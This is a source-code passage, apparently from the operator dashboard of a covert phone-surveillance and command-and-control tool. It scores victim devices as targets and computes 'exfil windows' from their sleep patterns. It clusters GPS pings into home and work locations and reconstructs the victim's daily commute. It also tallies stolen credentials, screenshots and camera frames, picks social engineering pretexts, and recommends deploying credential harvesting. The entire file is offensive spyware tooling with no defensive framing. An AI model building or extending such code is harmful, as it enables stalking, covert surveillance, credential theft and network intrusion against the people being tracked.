  let ipRaw = [];
  try { const p = device?.ip_history_json ? JSON.parse(device.ip_history_json) : null; ipRaw = Array.isArray(p) ? p : (p ? [p] : []); } catch {}
  const ipEntries = ipRaw.map(e => typeof e === 'object' && e !== null ? e : { ip: e, ts: null });
  const currentIp  = ipEntries[0]?.ip ?? null;
  // IP history analysis - detect cellular CGNAT, network roaming, stable WiFi
  const uniqueIPs       = [...new Map(ipEntries.map(e => [e.ip, e])).values()];
  const ipSubnets16     = uniqueIPs.map(e => e.ip.split('.').slice(0,2).join('.'));
  const uniqueSubnets16 = [...new Set(ipSubnets16)];
  const isCellularHint  = uniqueIPs.length >= 3 && uniqueSubnets16.length <= 2;
  const isRoaming       = uniqueSubnets16.length >= 3;
  const ipStability     = uniqueIPs.length <= 1 ? 'stable'
    : isCellularHint ? 'cellular'
    : isRoaming ? 'roaming'
    : 'shifting';
  // Transition timeline (only entries with timestamps)
  const ipTransitions = ipEntries.filter(e => e.ts).map((e, i, arr) => ({
    ip: e.ip, ts: parseUTC(e.ts),
    from: arr[i+1]?.ip ?? null,
  })).filter(t => t.ts);

  // WiFi timeline: derive confirmed WiFi windows from LAN scan + IP history
  const _lanHostsEvents = (events ?? []).filter(e => {
    const d = parseEvent(e); return e.type === 'lan_hosts' && d?.hosts?.length > 0;
  }).map(e => { const d = parseEvent(e); return { ts: parseUTC(e.timestamp), cidr: d?.cidr ?? '', count: d?.hosts?.length ?? 0 }; });
  // For each LAN scan, find when it became stale (next IP change after it)
  const _allWifiWindows = _lanHostsEvents.map(scan => {
    const nextIpChange = ipTransitions.find(t => t.ts > scan.ts);
    return { from: scan.ts, to: nextIpChange?.ts ?? null, cidr: scan.cidr, count: scan.count, stale: !!nextIpChange };
  });
  // Cluster by CIDR - many scans of the same subnet become one cube
  const wifiWindows = Object.values(_allWifiWindows.reduce((acc, w) => {
    const prev = acc[w.cidr];
    if (!prev) { acc[w.cidr] = { ...w, scanCount: 1 }; }
    else {
      const isNewer = w.from > prev.from;
      acc[w.cidr] = {
        cidr: w.cidr,
        from: isNewer ? w.from : prev.from,
        to: isNewer ? w.to : prev.to,
        stale: isNewer ? w.stale : prev.stale,
        count: Math.max(w.count, prev.count),
        scanCount: prev.scanCount + 1,
      };
    }
    return acc;
  }, {}));
  const localIps   = fp?.webrtcIPs?.local ?? [];
  const isPrivateIp = localIps.some(ip => /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip));
  const hasRelay   = !!netData?.apple_relay;
  const carrier    = netData?.carrier;
  const netType    = netData?.type;

  // Privacy awareness
  const privacyFlags = [
    hasRelay && 'iCloud Private Relay',
    fp?.media?.prefersReducedMotion === 'reduce' && 'Reduced motion enabled',
    iosMajor >= 17 && 'iOS 17+ (current patches)',
  ].filter(Boolean);
  const awareness = privacyFlags.length >= 2 ? 'High - tech-savvy, privacy-conscious' : privacyFlags.length === 1 ? 'Medium' : 'Low - unlikely to notice background activity';

  // Language / SE profile
  const lang     = fp?.language ?? 'unknown';
  const tz       = fp?.timezone ?? 'unknown';
  const langMap  = { 'he':'Hebrew - Israel/Jewish diaspora','he-IL':'Hebrew - Israel','en-US':'English (US)','en-GB':'English (UK)','ar':'Arabic','ru':'Russian' };
  const langLabel = langMap[lang] ?? lang;

  // ── Target Score ─────────────────────────────────────────────────────────
  const targetScore = Math.min(100, Math.round(
    (isPremium ? 15 : 5) + (isProModel ? 10 : 0) +
    Math.min(60, permScore) +
    (hasPersist ? 15 : 0) +
    (geoEvents.length > 0 ? 5 : 0) +
    (credCount > 0 ? 10 : 0)
  ));
  const scoreColor = targetScore >= 70 ? '#ef4444' : targetScore >= 40 ? '#f59e0b' : '#22c55e';

  // ── Exfil Window Calculator ───────────────────────────────────────────────
  // Find hours where device is consistently backgrounded WITH active audio session
  const exfilBuckets = Array(24).fill(0); // fractional hours of bg+audio per hour slot
  for (let i = 1; i < hbTimeline.length; i++) {
    const prv = hbTimeline[i-1], cur = hbTimeline[i];
    if (prv.d.visible === false && prv.d.audio === 'running') {
      let t = new Date(prv.ts);
      while (t < cur.ts) {
        const nextHour = new Date(t); nextHour.setMinutes(60,0,0);
        const sliceMs = Math.min(nextHour - t, cur.ts - t);
        exfilBuckets[t.getHours()] += sliceMs / 3600000;
        t = nextHour;
      }
    }
  }
  let bestExfil = null, bestExfilScore = 0;
  for (let startH = 0; startH < 24; startH++) {
    for (let len = 2; len <= 10; len++) {
      const score = Array.from({length:len}, (_,i) => exfilBuckets[(startH+i)%24]).reduce((s,v)=>s+v,0);
      if (score > bestExfilScore) {
        bestExfilScore = score;
        bestExfil = { start: startH, end: (startH+len)%24, len, hours: Math.round(score*10)/10 };
      }
    }
  }
  const hasExfilWindow = bestExfil && bestExfil.hours >= 0.5;
  const exfilWindowStr = hasExfilWindow
    ? `${String(bestExfil.start).padStart(2,'0')}:00 – ${String(bestExfil.end).padStart(2,'0')}:00`
    : null;

  // ── Dark Period Reliability Score ─────────────────────────────────────────
  const hbByDay = {};
  hbTimeline.forEach(({ts}) => {
    if (!ts) return;
    const key = ts.toISOString().slice(0,10);
    (hbByDay[key] ??= []).push(ts);
  });
  const darkStartHours = [];
  for (const key of Object.keys(hbByDay).sort()) {
    const sorted = hbByDay[key].sort((a,b) => a-b);
    let maxGap = 0, gapStart = null;
    for (let i = 1; i < sorted.length; i++) {
      const g = sorted[i] - sorted[i-1];
      if (g > maxGap) { maxGap = g; gapStart = sorted[i-1]; }
    }
    if (gapStart && maxGap > 3600000) darkStartHours.push(gapStart.getHours() + gapStart.getMinutes()/60);
  }
  let darkReliability = 0, darkWindowLabel = null;
  if (darkStartHours.length >= 2) {
    const mean = darkStartHours.reduce((s,v)=>s+v,0) / darkStartHours.length;
    const sd   = Math.sqrt(darkStartHours.reduce((s,v)=>s+(v-mean)*(v-mean),0) / darkStartHours.length);
    darkReliability = Math.round(Math.max(0, 100 - sd*28));
    const h = Math.floor(mean), m = Math.round((mean-h)*60);
    darkWindowLabel = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}`;
  }

  // ── Location Clustering ───────────────────────────────────────────────────
  const geoParsed = geoEvents.map(e => {
    const d = parseEvent(e);
    const lat = d?.lat ?? d?.latitude;
    const lon = d?.lon ?? d?.longitude;
    const ts  = parseUTC(e.timestamp);
    return (lat && lon && ts) ? { lat:Number(lat), lon:Number(lon), ts, hour:ts.getHours() } : null;
  }).filter(Boolean).sort((a,b) => a.ts-b.ts);

  function haversineM(la1,lo1,la2,lo2) {
    const R=6371000, dLa=(la2-la1)*Math.PI/180, dLo=(lo2-lo1)*Math.PI/180;
    const a=Math.sin(dLa/2)*Math.sin(dLa/2)+Math.cos(la1*Math.PI/180)*Math.cos(la2*Math.PI/180)*Math.sin(dLo/2)*Math.sin(dLo/2);
    return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
  }

  const clusters = [];
  geoParsed.forEach(p => {
    let nearIdx=null, nearDist=Infinity;
    clusters.forEach((c,i) => { const d=haversineM(p.lat,p.lon,c.lat,c.lon); if(d<nearDist){nearDist=d;nearIdx=i;} });
    if (nearIdx !== null && nearDist < 500) {
      const c=clusters[nearIdx];
      c.lat=(c.lat*c.count+p.lat)/(c.count+1); c.lon=(c.lon*c.count+p.lon)/(c.count+1);
      c.count++; c.pings.push(p);
    } else {
      clusters.push({ lat:p.lat, lon:p.lon, count:1, pings:[p] });
    }
  });
  clusters.sort((a,b)=>b.count-a.count);
  clusters.forEach((c,i) => {
    const night = c.pings.filter(p => p.hour>=22||p.hour<=6).length;
    const day   = c.pings.filter(p => p.hour>=8&&p.hour<=18).length;
    if (i===0) c.label = night>day ? 'Home' : day>night ? 'Work/School' : 'Primary Location';
    else if (i===1) c.label = day>night ? 'Work/School' : 'Secondary Location';
    else c.label = `Location ${i+1}`;
  });

  // ── Commute Detection ─────────────────────────────────────────────────────
  const transitions = [];
  if (clusters.length >= 2 && geoParsed.length >= 4) {
    const assigned = geoParsed.map(p => {
      let nearIdx=0, nearDist=Infinity;
      clusters.forEach((c,i) => { const d=haversineM(p.lat,p.lon,c.lat,c.lon); if(d<nearDist){nearDist=d;nearIdx=i;} });
      return { ...p, ci: nearIdx };
    });
    for (let i=1; i<assigned.length; i++) {
      if (assigned[i].ci !== assigned[i-1].ci)
        transitions.push({ from:assigned[i-1].ci, to:assigned[i].ci, hour:assigned[i].hour, ts:assigned[i].ts });
    }
  }
  const departHome  = transitions.filter(t=>clusters[t.from]?.label==='Home').map(t=>t.hour);
  const arriveHome  = transitions.filter(t=>clusters[t.to]?.label==='Home').map(t=>t.hour);
  const avgDepart   = departHome.length  ? Math.round(departHome.reduce((s,v)=>s+v,0)/departHome.length)  : null;
  const avgArrive   = arriveHome.length  ? Math.round(arriveHome.reduce((s,v)=>s+v,0)/arriveHome.length)  : null;

  // ── Corporate Pivot Score ─────────────────────────────────────────────────
  let corpScore = 0; const corpFactors = [];
  if (localIps.some(ip=>ip.startsWith('10.'))) { corpScore+=40; corpFactors.push('10.x.x.x LAN (enterprise/VPN)'); }
  else if (localIps.some(ip=>/^172\.(1[6-9]|2\d|3[01])\./.test(ip))) { corpScore+=35; corpFactors.push('172.16-31 LAN (datacenter)'); }
  else if (localIps.some(ip=>ip.startsWith('192.168.'))) { corpScore+=10; corpFactors.push('192.168.x.x LAN (home/office)'); }
  const uniqueSubnets = [...new Set(localIps.map(ip=>ip.split('.').slice(0,3).join('.')))];
  if (uniqueSubnets.length>1) { corpScore+=20; corpFactors.push(`${uniqueSubnets.length} distinct subnets`); }
  if (openTimes.length>=5) {
    const wdOpens = openTimes.filter(t=>t.getDay()>=1&&t.getDay()<=5).length;
    if (wdOpens > (openTimes.length-wdOpens)*3) { corpScore+=15; corpFactors.push('Weekday-only usage'); }
    const bizOpens = openTimes.filter(t=>t.getHours()>=8&&t.getHours()<=18).length;
    if (bizOpens/openTimes.length>0.8) { corpScore+=15; corpFactors.push('Business-hours only'); }
  }
  corpScore = Math.min(100, corpScore);
  const corpColor = corpScore>=60?'#ef4444':corpScore>=30?'#f59e0b':'#4e5a70';

  // ── Screenshot / Camera Intelligence ─────────────────────────────────────
  const ssCount  = screenshots?.length ?? 0;
  const camCount = cameraFrames?.length ?? 0;
  const ssBuckets = {Morning:0,Afternoon:0,Evening:0,Night:0};
  screenshots?.forEach(s => {
    const t = parseUTC(s.timestamp); if (!t) return;
    const h = t.getHours();
    const b = h>=6&&h<12?'Morning':h>=12&&h<18?'Afternoon':h>=18&&h<22?'Evening':'Night';
    ssBuckets[b]++;
  });
  const peakSsBucket = Object.entries(ssBuckets).sort((a,b)=>b[1]-a[1])[0];
  const camTimes     = cameraFrames?.map(f => parseUTC(f.timestamp)).filter(Boolean) ?? [];
  const camNight     = camTimes.filter(t=>t.getHours()>=20||t.getHours()<=7).length;

  // ── IC card component ─────────────────────────────────────────────────────
  const IC = ({ icon, title, value, sub, color='#c9d1e8', border='rgba(255,255,255,0.09)', badge, children }) => (
    <div style={{ background:'#0c0d1a', borderRadius:12, border:`1px solid ${border}`, padding:'14px 16px' }}>
      <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:8 }}>
        <span style={{ fontSize:18 }}>{icon}</span>
        <span style={{ fontSize:11, fontWeight:700, color:'#4e5a70', textTransform:'uppercase', letterSpacing:'0.07em', flex:1 }}>{title}</span>
        {badge && <span style={{ fontSize:10, fontWeight:700, color:badge.c, background:badge.c+'22', border:`1px solid ${badge.c}44`, borderRadius:6, padding:'2px 7px' }}>{badge.t}</span>}
      </div>
      <div style={{ fontSize:13, color, fontWeight:600, lineHeight:1.4 }}>{value}</div>
      {sub && <div style={{ fontSize:11, color:'#4e5a70', marginTop:5, lineHeight:1.5 }}>{sub}</div>}
      {children}
    </div>
  );

  return (
    <div style={{ display:'flex', flexDirection:'column', gap:20 }}>
      <style>{`@keyframes _scorePulse{0%,100%{box-shadow:0 0 0 0 ${scoreColor}44}50%{box-shadow:0 0 0 8px ${scoreColor}00}}`}</style>

      {/* ── Target Score Header ── */}
      <div style={{ background:'#0c0d1a', borderRadius:16, border:`1px solid ${scoreColor}44`, padding:'20px 24px', display:'flex', alignItems:'center', gap:24 }}>
        <div style={{ width:72, height:72, borderRadius:'50%', border:`3px solid ${scoreColor}`, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', flexShrink:0, animation:'_scorePulse 2s ease-in-out infinite' }}>
          <span style={{ fontSize:26, fontWeight:700, color:scoreColor, lineHeight:1 }}>{targetScore}</span>
          <span style={{ fontSize:9, color:scoreColor+'99', fontWeight:600 }}>/100</span>
        </div>
        <div style={{ flex:1 }}>
          <div style={{ fontSize:11, color:'#4e5a70', textTransform:'uppercase', letterSpacing:'0.08em', marginBottom:4 }}>Target Value Score</div>
          <div style={{ fontSize:18, fontWeight:700, color:scoreColor, marginBottom:6 }}>
            {targetScore>=75?'⚡ High-Value Target':targetScore>=45?'⚠ Medium-Value Target':'● Low-Value Target'}
          </div>
          <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
            {isPremium && <span style={{ fontSize:10, fontWeight:600, color:'#f59e0b', background:'rgba(245,158,11,0.09)', borderRadius:5, padding:'2px 7px' }}>Premium Device</span>}
            {hasPersist && <span style={{ fontSize:10, fontWeight:600, color:'#22c55e', background:'rgba(34,197,94,0.09)', borderRadius:5, padding:'2px 7px' }}>Persistent C2</span>}
            {geoEvents.length>0 && <span style={{ fontSize:10, fontWeight:600, color:'#3b82f6', background:'rgba(59,130,246,0.09)', borderRadius:5, padding:'2px 7px' }}>Location Collected</span>}
            {credCount>0 && <span style={{ fontSize:10, fontWeight:600, color:'#ef4444', background:'rgba(239,68,68,0.09)', borderRadius:5, padding:'2px 7px' }}>{credCount} Credentials</span>}
            {hasExfilWindow && <span style={{ fontSize:10, fontWeight:600, color:'#a78bfa', background:'#bf5af218', borderRadius:5, padding:'2px 7px' }}>Exfil Window Mapped</span>}
          </div>
        </div>
      </div>

      {/* ── Grid ── */}
      <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fill, minmax(280px, 1fr))', gap:12 }}>

        <IC icon="📱" title="Device Profile"
          value={`iPhone ${tier} · iOS ${iosVer??'?'}`}
          sub={isProModel?'Pro/Max → likely professional or high-income. Titanium chassis signals premium spend.':isPremium?'Standard flagship - mainstream professional or young adult.':'Mid-range - average consumer profile.'}
          badge={isProModel?{t:'Pro',c:'#f59e0b'}:undefined}
        />

        <IC icon="🧠" title="Privacy & Security Awareness"
          value={awareness}
          sub={privacyFlags.length?privacyFlags.join(' · '):'No privacy tools detected. User unlikely to notice passive collection or background activity.'}
          border={privacyFlags.length>=2?'rgba(239,68,68,0.27)':'rgba(255,255,255,0.09)'}
          color={privacyFlags.length>=2?'#f59e0b':'#22c55e'}
        />

        <IC icon="🌐" title="Network Intelligence"
          value={hasRelay?'🍎 iCloud Private Relay':netType==='cellular'?`📶 Cellular - ${carrier??'Unknown'}`:`🌐 WiFi - ${carrier??'Unknown'}`}
          sub={[currentIp&&`Current IP: ${currentIp}`, localIps.length&&`LAN: ${localIps.slice(0,2).join(', ')}${localIps.length>2?` +${localIps.length-2}`:''}`, isPrivateIp&&'Private subnet → pivot opportunity'].filter(Boolean).join(' · ')||null}
        />

        {/* WiFi Timeline */}
        {wifiWindows.length > 0 && wifiWindows.map((w, i) => {
          const fmtTs = ts => ts ? ts.toLocaleString('en-IL', { timeZone: 'Asia/Jerusalem', day:'2-digit', month:'2-digit', hour:'2-digit', minute:'2-digit' }) : null;
          const fromStr = fmtTs(w.from) ?? '?';
          const toStr = w.to ? fmtTs(w.to) : 'now';
          const rangeLabel = `${fromStr} → ${toStr}`;
          const subParts = [
            `${w.count} live hosts`,
            w.scanCount > 1 ? `${w.scanCount} scans` : null,
            w.stale ? `session ended ${fmtTs(w.to)}` : 'session ongoing',
            'LAN scan confirms WiFi - pivot opportunity',
          ].filter(Boolean);
          return (
            <IC key={`wifi-win-${w.cidr}`} icon="🌐" title={`WiFi Confirmed - ${w.cidr}`}
              value={rangeLabel}
              sub={subParts.join(' · ')}
              color={w.stale ? '#4e5a70' : '#3b82f6'}
              border={w.stale ? 'rgba(255,255,255,0.09)' : 'rgba(59,130,246,0.27)'}
              badge={w.stale ? {t:'PAST',c:'#4e5a70'} : {t:'ACTIVE',c:'#3b82f6'}}
            />
          );
        })}

        <IC icon="🎯" title="Persistence Status"
          value={hasPersist?'Active - Running in background':isOnline?'Online (foreground)':'Offline'}
          sub={hasPersist?'Audio session alive. JS executing at full speed. Beacon ~1.5s. Cannot be killed silently.':'No background session. Foreground required for beacon activity.'}
          color={hasPersist?'#22c55e':'#4e5a70'}
          border={hasPersist?'rgba(34,197,94,0.27)':'rgba(255,255,255,0.09)'}
          badge={hasPersist?{t:'C2 ALIVE',c:'#22c55e'}:undefined}
        />

        <IC icon="🔓" title="Attack Surface"
          value={`${grantedPerms.length} permission${grantedPerms.length!==1?'s':''} granted`}
          sub={grantedPerms.length>0
            ?`Active: ${grantedPerms.slice(0,5).join(', ')}${grantedPerms.length>5?` +${grantedPerms.length-5} more`:''}.${grantedPerms.includes('geolocation')?' GPS active.':''}${grantedPerms.includes('camera')?' Silent photo.':''}${grantedPerms.includes('microphone')?' Ambient audio.':''}`
            :'No permissions yet. Use social engineering or harvest modules to expand access.'}
          border={grantedPerms.length>=3?'rgba(239,68,68,0.27)':'rgba(255,255,255,0.09)'}
          color={grantedPerms.length>=3?'#ef4444':'#f59e0b'}
        />

        {/* Exfil Window Calculator */}
        {hasExfilWindow && (
          <IC icon="🕳️" title="Optimal Exfil Window"
            value={exfilWindowStr}
            sub={`${bestExfil.hours}h of observed bg+audio coverage. Device consistently backgrounded with C2 alive during this window - optimal for heavy data collection, command execution, and geo polling without any user awareness.`}
            color="#bf5af2"
            border="rgba(167,139,250,0.27)"
            badge={{t:'EXFIL',c:'#a78bfa'}}
          />
        )}

        {/* Dark Period Reliability */}
        {darkStartHours.length>=2 && (
          <IC icon="🌑" title="Dark Period Reliability"
            value={`${darkReliability}% reliable · Usually goes dark ~${darkWindowLabel}`}
            sub={`Analyzed ${darkStartHours.length} day${darkStartHours.length>1?'s':''}. ${darkReliability>=75?'Highly predictable - schedule exfil commands for '+darkWindowLabel+' daily.':darkReliability>=40?'Moderately consistent - use as a guide, not guarantee.':'Irregular - no reliable quiet window identified yet.'}`}
            color={darkReliability>=75?'#22c55e':darkReliability>=40?'#f59e0b':'#4e5a70'}
            border={darkReliability>=75?'rgba(34,197,94,0.27)':darkReliability>=40?'rgba(245,158,11,0.27)':'rgba(255,255,255,0.09)'}
          >
            {/* Mini reliability bar */}
            <div style={{ marginTop:8, height:4, borderRadius:2, background:'rgba(255,255,255,0.09)', overflow:'hidden' }}>
              <div style={{ height:'100%', width:`${darkReliability}%`, background: darkReliability>=75?'#22c55e':darkReliability>=40?'#f59e0b':'#4e5a70', borderRadius:2 }} />
            </div>
          </IC>
        )}

        {/* Location Clustering */}
        {clusters.length>0 && (
          <IC icon="🗺️" title={`Location Map - ${clusters.length} Cluster${clusters.length>1?'s':''}`}
            value={clusters.slice(0,3).map(c=>`${c.label} (${c.count} ping${c.count>1?'s':''})`).join(' · ')}
            sub={clusters.slice(0,2).map(c=>`${c.label}: ${c.lat.toFixed(5)}, ${c.lon.toFixed(5)}`).join(' · ')}
            color="#0a84ff"
            border="rgba(59,130,246,0.27)"
            badge={clusters.length>=2?{t:'MAPPED',c:'#3b82f6'}:undefined}
          />
        )}

        {/* Commute Detection */}
        {transitions.length>=2 && (
          <IC icon="🚗" title="Daily Routine Mapped"
            value={[avgDepart!==null&&`Leaves Home ~${String(avgDepart).padStart(2,'0')}:00`, avgArrive!==null&&`Returns ~${String(avgArrive).padStart(2,'0')}:00`].filter(Boolean).join(' · ') || `${transitions.length} location transitions observed`}
            sub={`${transitions.length} detected transitions between clusters. Physical routine reconstructed - predictable windows for unattended device access.`}
            color="#ff9f0a"
            border="rgba(245,158,11,0.27)"
          />
        )}

        {/* Corporate Pivot Score */}
        <IC icon="🏢" title="Corporate Pivot Score"
          value={`${corpScore}/100 - ${corpScore>=60?'Likely corporate network':corpScore>=30?'Possible office/VPN':'Residential / personal'}`}
          sub={corpFactors.length?corpFactors.join(' · '):'No enterprise indicators detected.'}
          color={corpColor}
          border={corpScore>=30?corpColor+'44':'rgba(255,255,255,0.09)'}
          badge={corpScore>=60?{t:'CORP NET',c:'#ef4444'}:undefined}
        >
          <div style={{ marginTop:8, height:4, borderRadius:2, background:'rgba(255,255,255,0.09)', overflow:'hidden' }}>
            <div style={{ height:'100%', width:`${corpScore}%`, background:corpColor, borderRadius:2 }} />
          </div>
        </IC>

        {/* IP Transition Analysis */}
        {uniqueIPs.length>=2 && (
          <IC icon="📡" title="IP History Analysis"
            value={ipStability==='cellular'?`Cellular CGNAT - ${uniqueIPs.length} IPs, ${uniqueSubnets16.length} provider pool${uniqueSubnets16.length>1?'s':''}`:ipStability==='roaming'?`Network roaming - ${uniqueSubnets16.length} distinct networks`:ipStability==='shifting'?`${uniqueIPs.length} IP changes (same subnet)`:`${uniqueIPs.length} IPs observed`}
            sub={[
              `IPs: ${uniqueIPs.slice(0,3).map(e=>e.ip).join(', ')}${uniqueIPs.length>3?` +${uniqueIPs.length-3} more`:''}`,
              ipStability==='cellular'&&'Rapid cycling in same /16 = cellular CGNAT. User primarily mobile.',
              ipStability==='roaming'&&`${uniqueSubnets16.length} different /16 prefixes → home/office/cellular movement. Correlate with location clusters.`,
              ipStability==='shifting'&&'IP changed within same subnet - DHCP renewal, same network.',
              ipTransitions.length>0&&`Last change: ${ipTransitions[0].ts?.toLocaleTimeString('en-IL',{timeZone:'Asia/Jerusalem',hour:'2-digit',minute:'2-digit'})}${ipTransitions[0].from?` (from ${ipTransitions[0].from})`:''}`
            ].filter(Boolean).join(' · ')}
            color={ipStability==='roaming'?'#f59e0b':ipStability==='cellular'?'#3b82f6':'#4e5a70'}
            border={ipStability==='roaming'?'rgba(245,158,11,0.27)':ipStability==='cellular'?'rgba(59,130,246,0.27)':'rgba(255,255,255,0.09)'}
            badge={isRoaming?{t:'ROAMING',c:'#f59e0b'}:isCellularHint?{t:'CELLULAR',c:'#3b82f6'}:undefined}
          >
            {/* Mini IP timeline */}
            {ipTransitions.length>=2 && (
              <div style={{ marginTop:10, display:'flex', flexDirection:'column', gap:3 }}>
                {ipTransitions.slice(0,4).map((t,i) => (
                  <div key={i} style={{ display:'flex', gap:8, alignItems:'center' }}>
                    <span style={{ fontSize:9, color:'#4e5a70', fontVariantNumeric:'tabular-nums', flexShrink:0 }}>
                      {t.ts?.toLocaleTimeString('en-IL',{timeZone:'Asia/Jerusalem',hour:'2-digit',minute:'2-digit'})}
                    </span>
                    <span style={{ fontSize:10, color: i===0?'#c9d1e8':'#4e5a70', fontFamily:'monospace', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                      {t.ip}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </IC>
        )}

        {openTimes.length>=3 && (
          <IC icon="🕐" title="Behavioral Pattern"
            value={`Peak usage: ${peakHour}:00 – ${(peakHour+2)%24}:00`}
            sub={[sleepPattern, bgPeriods.length>0&&`Avg background: ${Math.round(avgBg/60000)}min · Longest: ${Math.round(longestBg/60000)}min`, `${openTimes.length} app opens recorded`].filter(Boolean).join(' · ')}
          />
        )}

        {/* Screenshot / Camera Intelligence */}
        {(ssCount>0||camCount>0) && (
          <IC icon="📸" title="Visual Intelligence"
            value={[ssCount>0&&`${ssCount} screenshot${ssCount>1?'s':''}`, camCount>0&&`${camCount} camera frame${camCount>1?'s':''}`].filter(Boolean).join(' · ')}
            sub={[
              peakSsBucket&&peakSsBucket[1]>0&&`Screenshots peak: ${peakSsBucket[0]} (${peakSsBucket[1]})`,
              camCount>0&&camNight>0&&`${camNight} night-time camera frame${camNight>1?'s':''} - user captured in low-light/home environment`,
              camCount>0&&'Physical environment recorded - correlate with geo clusters for location confirmation',
            ].filter(Boolean).join(' · ')}
            color="#ff9f0a"
          />
        )}

        <IC icon="🌍" title="Social Engineering Profile"
          value={langLabel}
          sub={[`Timezone: ${tz}`, carrier&&`Carrier: ${carrier}`, `Pretext: ${hasRelay?'Low-pressure / technical (cautious user)':privacyFlags.length>=2?'Authority + urgency (aware, needs convincing)':'Standard authority/urgency'}`].filter(Boolean).join(' · ')}
        />

        <IC icon="⚔️" title="Recommended Next Actions"
          value={[
            !grantedPerms.includes('geolocation')&&'📍 Request Geolocation',
            !audioActive&&'🔊 Trigger audio unlock (idle overlay)',
            !grantedPerms.includes('notifications')&&'🔔 Request Notifications (persistent C2)',
            geoEvents.length===0&&grantedPerms.includes('geolocation')&&'📡 Poll location now',
            credCount===0&&'🔑 Deploy credential harvest',
          ].filter(Boolean).slice(0,3).join(' · ')||'Maximum access achieved - maintain persistence'}
          sub="Based on current permission state and access gaps."
          color="#bf5af2"
          border="rgba(167,139,250,0.27)"
        />

        {longestBg>3600000 && (
          <IC icon="😴" title="Unattended Window Detected"
            value={`${Math.round(longestBg/3600000*10)/10}h background session observed`}
            sub="Device backgrounded for an extended period - likely sleep. Optimal for silent data collection and command execution without user awareness."
            color="#ff9f0a"
            border="rgba(245,158,11,0.27)"
            badge={{t:'OPPORTUNITY',c:'#f59e0b'}}
          />
        )}

      </div>
    </div>
  );
}

function deviceStatus(lastSeen) {
  if (!lastSeen) return 'unknown';
  const diff = Date.now() - parseUTC(lastSeen).getTime();
  if (diff < 5_000) return 'online';
  if (diff < 15_000) return 'stale';
  return 'offline';
}

export default function DeviceDetail() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [events, setEvents] = useState([]);
  const [creds, setCreds] = useState([]);
  const [commands, setCommands] = useState([]);
  const [tab, setTab] = useState(() => {
    const saved = sessionStorage.getItem(`wc_tab_${id}`);
    return saved !== null ? parseInt(saved, 10) : 0;
  });
  const [loading, setLoading] = useState(true);
  const [deleting, setDeleting] = useState(false);
  const [clearingEvents, setClearingEvents] = useState(false);
  const [reloadSentAt, setReloadSentAt] = useState(null);
  const [reloadDone, setReloadDone] = useState(false);
  const [editingName, setEditingName] = useState(false);
  const [nameInput, setNameInput] = useState('');
  const [screenshots, setScreenshots] = useState([]);
  const [cameraFrames, setCameraFrames] = useState([]);
  const [videos, setVideos] = useState([]);
  const [recordings, setRecordings] = useState([]);
  const [lightbox, setLightbox] = useState(null);
  const [shotSentAt, setShotSentAt] = useState(null);
  const [shotDone, setShotDone] = useState(false);
  const fastPollRef = useRef(null);
  const [intelToast, setIntelToast] = useState(null);
  const [motionSessionActive, setMotionSessionActive] = useState(() => {
    try { return JSON.parse(localStorage.getItem('motionSession') || 'null')?.deviceId === String(id); }
    catch { return false; }
  });

  useEffect(() => {
    const checker = setInterval(() => {
      try {
        const s = JSON.parse(localStorage.getItem('motionSession') || 'null');
        setMotionSessionActive(s?.deviceId === String(id));
      } catch { setMotionSessionActive(false); }
    }, 500);
    return () => clearInterval(checker);
  }, [id]);
  const _latestHb = events?.find(e => e.type === 'heartbeat');
  const _latestHbParsed = parseEvent(_latestHb);
  const audioUnlocked = _latestHbParsed?.audio === 'running';
  // Events are sorted DESC (newest first) - find() returns the latest entry directly.
  const appVisible = _latestHb ? !!_latestHbParsed?.visible : true;
  const prevCountsRef = useRef(null);
  const toastTimerRef = useRef(null);

  function startFastPoll(durationMs = 8000) {
    if (fastPollRef.current) clearInterval(fastPollRef.current);
    const end = Date.now() + durationMs;
    fastPollRef.current = setInterval(() => {
      load();
      if (Date.now() >= end) {
        clearInterval(fastPollRef.current);
        fastPollRef.current = null;
      }
    }, 600);
  }

  async function load() {
    try {
      const [dev, evs, latest, crs, cmds, shots, frames, vids, recs] = await Promise.all([
        apiFetch(`/api/devices/${id}`),
        apiFetch(`/api/devices/${id}/events?limit=200`),
        apiFetch(`/api/devices/${id}/latest-by-type`),
        apiFetch(`/api/devices/${id}/credentials`),
        apiFetch(`/api/devices/${id}/commands`),
        apiFetch(`/api/devices/${id}/screenshots`),
        apiFetch(`/api/devices/${id}/camera`),
        apiFetch(`/api/devices/${id}/videos`),
        apiFetch(`/api/devices/${id}/recordings`),
      ]);
      // Merge latest-by-type into events: ensures structural types (fingerprint, network, permissions…)
      // are always present regardless of total event volume. Deduplicate by id.
      const evMap = new Map(evs.map(e => [e.id, e]));
      latest.forEach(e => { if (!evMap.has(e.id)) evMap.set(e.id, e); });
      setDevice(dev);
      setEvents([...evMap.values()]);
      setCreds(crs);
      setCommands(cmds);
      setScreenshots(shots);
      setCameraFrames(frames);
      setVideos(vids);
      setRecordings(recs ?? []);
    } catch (e) {
      if (e.message.includes('404')) navigate('/devices');
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    load();
    const timer = setInterval(load, motionSessionActive ? 1000 : 3_000);
    return () => clearInterval(timer);
  }, [id, motionSessionActive]);

  useEffect(() => {
    if (!reloadSentAt || reloadDone) return;
    const completed = events.find(e => e.type === 'app_open' && parseUTC(e.timestamp)?.getTime() > reloadSentAt);
    if (completed) {
      setReloadDone(true);
      setTimeout(() => { setReloadDone(false); setReloadSentAt(null); }, 1000);
    }
  }, [events, reloadSentAt]);

  useEffect(() => {
    if (!shotSentAt || shotDone) return;
    const arrived = screenshots.find(s => parseUTC(s.timestamp)?.getTime() > shotSentAt);
    if (arrived) {
      setShotDone(true);
      setTimeout(() => { setShotDone(false); setShotSentAt(null); }, 1500);
    }
  }, [screenshots, shotSentAt]);

  useEffect(() => {
    if (loading) return;
    const cur = {
      geo:       events.filter(e => e.type === 'geolocation').length,
      clipboard: events.filter(e => e.type === 'clipboard').length,
      filesystem: events.filter(e => e.type === 'filesystem').length,
      payment:   events.filter(e => e.type === 'payment_response').length,
